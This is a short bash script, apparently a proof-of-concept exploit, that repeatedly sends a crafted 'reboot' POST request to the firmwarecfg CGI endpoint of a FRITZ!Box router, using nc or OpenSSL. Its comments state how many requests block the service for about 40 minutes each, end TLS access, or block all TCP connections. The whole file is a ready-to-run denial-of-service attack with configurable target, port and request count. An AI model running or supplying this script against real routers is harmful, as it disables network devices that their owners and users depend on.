#! /bin/bash 
#####################################################################################
#                                                                                   #
# create the HTTP request                                                           #
#                                                                                   #
#####################################################################################
post_request()
{
	local host="$1"
	cat <<EOT
POST /cgi-bin/firmwarecfg HTTP/1.1
User-Agent: handcrafted_exploit/0.1 (shell)
Accept: */*
Host: $1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

reboot
EOT
}
#####################################################################################
#                                                                                   #
# parameters and defaults                                                           #
#                                                                                   #
#####################################################################################
# IP address of FRITZ!Box
host="${1:-192.168.178.1}"
# port to use (change it, if you're using TLS)
port="${2:-80}"
# 0 - without TLS (nc needed), 1 - use OpenSSL as TLS client
ssl="${3:-0}"
# number of consecutive requests, each will block 'firmwarecfg' for about 40 minutes
#
# 15 requests with TLS will render the device unusable for further TLS connections
# and ~180 requests without TLS will block any further TCP connection to the router;
# but the routing process is still functioning
requests="${4:-3}"
#####################################################################################
#                                                                                   #
# take 'firmwarecfg' on the specified FRITZ!Box router down for a while             #
#                                                                                   #
#####################################################################################
count=0
echo "Start was at $(date) ..."
start=$(date +%s)
while [ $count -lt $requests ]; do
	if [ $ssl -eq 0 ]; then
		post_request "$host" | nc -q 1 -C -v -w 2 $host $port
		rc=$?
	else
		post_request "$host" | openssl s_client -connect $host:$port -showcerts -debug -msg -state -tls1_2 -no_ign_eof 
		rc=$?
	fi
	count=$(( count + 1 ))
	echo "Sent request number $count"
	[ $rc -ne 0 ] && break
	[ $ssl -eq 1 ] && [ $count -ge 15 ] && break # parallel SSL connections are limited
done
duration=$(( $(date +%s) - start ))
echo -n "Summary: sent $count requests to $host:$port (with"
[ $ssl -eq 0 ] && echo -n "out"
echo " TLS), finished at $(date), send duration was $duration seconds"
